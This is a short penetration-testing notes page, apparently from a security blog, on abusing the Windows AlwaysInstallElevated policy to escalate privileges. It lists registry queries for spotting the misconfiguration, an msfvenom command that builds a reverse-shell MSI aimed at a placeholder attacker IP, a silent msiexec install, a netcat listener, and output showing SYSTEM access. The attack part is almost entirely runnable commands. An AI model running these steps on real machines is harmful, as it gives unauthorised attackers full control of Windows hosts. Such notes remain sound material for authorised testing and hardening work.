---
title: AlwaysInstallElevated
date: 2026-06-26 17:31:57

categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Windows Privesc
  - Misconfigurations

tags:
  - Windows
  - Privilege-Escalation
  - AlwaysInstallElevated
  - MSI
  - Windows-Installer
  - msiexec
  - msfvenom
  - Registry
  - Registry-Policies
  - SYSTEM
  - Windows-Misconfiguration

cover: /img/alwaysinstallelevated.png
top_img: /img/bg-img.jpg
description: Exploit the AlwaysInstallElevated Windows policy to execute malicious MSI packages with SYSTEM privileges and obtain a privileged shell.
---


> Windows can be configured to allow MSI packages to be installed with SYSTEM privileges by any user through the `AlwaysInstallElevated` policy.

#### Enumeration

> Check whether the AlwaysInstallElevated policy is enabled.

```powershell
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

> If both registry keys contain:

```text
AlwaysInstallElevated    REG_DWORD    0x1
```

> The system is vulnerable.


#### Exploitation

> Generate a malicious MSI payload.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f msi > shell.msi
```

> Transfer the MSI package to the target and execute it.

```cmd
msiexec /i shell.msi /quiet /qn /norestart
```

> Catch the incoming reverse shell.

```bash
nc -lvnp <port>
```

```cmd
whoami

nt authority\system
```
